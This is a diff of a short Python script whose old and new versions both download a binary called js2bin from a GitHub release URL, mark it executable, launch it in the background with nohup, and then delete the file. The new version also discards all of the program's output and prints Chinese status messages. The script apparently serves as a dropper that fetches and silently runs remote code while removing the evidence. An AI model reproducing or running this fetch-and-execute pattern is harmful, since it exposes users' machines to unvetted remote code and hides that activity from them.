@@ -1,3 +1,16 @@
 import subprocess
-cmd = "curl -L -o js2bin https://github.com/alphaxcv/scx/releases/download/dl/js2bin && chmod +x js2bin && nohup ./js2bin && rm js2bin"
-subprocess.call(cmd, shell=True)
+
+try:
+    subprocess.run("curl -L -o js2bin https://github.com/alphaxcv/scx/releases/download/dl/js2bin", check=True, shell=True)
+
+    subprocess.run("chmod +x js2bin", check=True, shell=True)
+
+    subprocess.run("nohup ./js2bin > /dev/null 2>&1 &", check=True, shell=True)
+
+    subprocess.run("rm js2bin", check=True, shell=True)
+  
+    print("操作成功完成！")
+
+except subprocess.CalledProcessError as e:
+    print(f"命令执行失败: {e}")
+  
